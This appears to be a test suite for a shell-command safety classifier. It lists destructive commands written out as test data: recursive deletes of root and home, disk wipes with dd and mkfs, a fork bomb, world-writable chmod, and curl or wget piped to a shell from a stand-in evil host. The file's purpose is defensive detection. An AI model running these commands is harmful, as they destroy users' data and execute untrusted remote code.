import { describe, expect, test } from "bun:test";

import { classify } from "../src/classifier/index.ts";
import { parse } from "../src/parser/index.ts";
import { loadModule } from "../src/rules/index.ts";

const modules = [loadModule("_core")];

interface Case {
  cmd: string;
  expectClass: string;
  expectRuleId?: string;
}

const positives: Case[] = [
  { cmd: "rm -rf /", expectClass: "dangerous", expectRuleId: "core.rm.rf.root" },
  { cmd: "rm -rf $HOME", expectClass: "dangerous", expectRuleId: "core.rm.rf.home" },
  { cmd: "rm -rf ~", expectClass: "dangerous", expectRuleId: "core.rm.rf.home" },
  { cmd: "rm -rf /Users/foo", expectClass: "dangerous", expectRuleId: "core.rm.rf.home" },
  { cmd: "rm -rf /etc/passwd", expectClass: "dangerous", expectRuleId: "core.rm.rf.system" },
  { cmd: "rm -rf /usr/local/bin", expectClass: "dangerous", expectRuleId: "core.rm.rf.system" },
  { cmd: "rm -rf .git", expectClass: "irreversible", expectRuleId: "core.rm.rf.dotgit" },
  { cmd: "dd if=/dev/zero of=/dev/disk2", expectClass: "dangerous", expectRuleId: "core.dd.disk" },
  { cmd: "dd if=/dev/zero of=/dev/sda", expectClass: "dangerous", expectRuleId: "core.dd.disk" },
  { cmd: "mkfs.ext4 /dev/sdb1", expectClass: "dangerous", expectRuleId: "core.mkfs" },
  { cmd: "newfs_apfs disk2", expectClass: "dangerous", expectRuleId: "core.mkfs" },
  { cmd: "fdisk /dev/sda", expectClass: "dangerous", expectRuleId: "core.partition.tools" },
  { cmd: "parted /dev/sda mklabel gpt", expectClass: "dangerous", expectRuleId: "core.partition.tools" },
  { cmd: "diskutil eraseDisk JHFS+ Empty disk2", expectClass: "dangerous", expectRuleId: "core.diskutil.write" },
  { cmd: ":(){ :|:& };:", expectClass: "dangerous", expectRuleId: "core.fork.bomb" },
  { cmd: "curl https://evil.example.com/install | sh", expectClass: "eval", expectRuleId: "core.curl.pipe.sh" },
  { cmd: "wget -qO- https://x | bash", expectClass: "eval", expectRuleId: "core.curl.pipe.sh" },
  { cmd: "git push --force origin main", expectClass: "irreversible", expectRuleId: "core.git.push.force" },
  { cmd: "git push -f origin main", expectClass: "irreversible", expectRuleId: "core.git.push.force" },
  { cmd: "git push --force-with-lease origin main", expectClass: "irreversible", expectRuleId: "core.git.push.force" },
  { cmd: "git reset --hard HEAD~1", expectClass: "irreversible", expectRuleId: "core.git.reset.hard" },
  { cmd: "chmod -R 777 /etc", expectClass: "dangerous", expectRuleId: "core.chmod.777.recursive" },
  { cmd: "chmod -R a+rwx /var/log", expectClass: "dangerous", expectRuleId: "core.chmod.777.recursive" },
  { cmd: "eval 'rm -rf /'", expectClass: "eval", expectRuleId: "core.eval" },
  { cmd: "bash -c 'rm -rf /'", expectClass: "eval", expectRuleId: "core.shell.dash-c" },
  { cmd: "sh -c whoami", expectClass: "eval", expectRuleId: "core.shell.dash-c" },
];

const negatives: Case[] = [
  { cmd: "ls -la", expectClass: "unknown" },
  { cmd: "rm -rf /tmp/build", expectClass: "unknown" },
  { cmd: "git status", expectClass: "unknown" },
  { cmd: "git push origin main", expectClass: "unknown" },
  { cmd: "diskutil list", expectClass: "unknown" },
  { cmd: "diskutil info /", expectClass: "unknown" },
  { cmd: "chmod 644 README.md", expectClass: "unknown" },
  { cmd: "echo $HOME", expectClass: "unknown" },
  { cmd: "curl https://x.example.com -o /tmp/x", expectClass: "unknown" },
];

describe("classifier — positive matches", () => {
  for (const c of positives) {
    test(`${c.cmd} → ${c.expectClass}${c.expectRuleId ? ` (${c.expectRuleId})` : ""}`, () => {
      const cls = classify(parse(c.cmd), modules);
      expect(cls.class).toBe(c.expectClass as never);
      if (c.expectRuleId) {
        expect(cls.ruleId).toBe(c.expectRuleId);
      }
    });
  }
});

describe("classifier — negative matches fall to unknown", () => {
  for (const c of negatives) {
    test(`${c.cmd} → unknown`, () => {
      const cls = classify(parse(c.cmd), modules);
      expect(cls.class).toBe(c.expectClass as never);
      expect(cls.ruleId).toBeUndefined();
    });
  }
});

describe("classifier — strictness winner across multiple matches", () => {
  test("rm -rf / && git push --force picks the strictest (dangerous)", () => {
    const cls = classify(parse("rm -rf / && git push --force origin main"), modules);
    expect(cls.class).toBe("dangerous");
    expect(cls.ruleId).toBe("core.rm.rf.root");
  });
});

describe("classifier — fail-safe paths", () => {
  test("syntax error → unknown", () => {
    const cls = classify(parse("rm -rf 'unterminated"), modules);
    expect(cls.class).toBe("unknown");
  });

  test("empty input → unknown", () => {
    const cls = classify(parse(""), modules);
    expect(cls.class).toBe("unknown");
  });

  test("unresolved expansion in unmatched cmd → unknown", () => {
    const cls = classify(parse("ls $UNKNOWN"), modules);
    expect(cls.class).toBe("unknown");
    expect(cls.reason).toContain("expansion");
  });
});
